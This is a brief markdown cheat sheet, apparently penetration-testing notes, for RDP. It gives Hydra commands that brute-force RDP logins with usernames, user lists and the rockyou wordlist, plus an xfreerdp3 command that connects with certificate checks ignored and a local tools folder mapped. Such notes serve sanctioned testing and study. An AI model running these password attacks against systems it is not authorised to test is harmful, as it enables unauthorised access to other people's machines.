# RDP

## Single Username and Single Password
```bash
hydra -l <username> -p <password> rdp://<target-ip>
```

## Single username, password list:
```bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt rdp://<target-ip>
```

## Username list, single password:
```bash
hydra -L <userfile> -p <password> rdp://<target-ip>
```

## Username list, password list:
```bash
hydra -L <userfile> -P /usr/share/wordlists/rockyou.txt rdp://<target-ip>
```

## Logging in RDP
```bash
xfreerdp3 /v:<target-ip> /u:<username> /p:<password> /cert:ignore +clipboard +fonts +compression /dynamic-resolution /drive:tools,<local-path>

#Example:
xfreerdp3 /v:192.168.96.206 /u:testuser /p:password /cert:ignore +clipboard +fonts +compression /dynamic-resolution /drive:tools,/home/kali/tools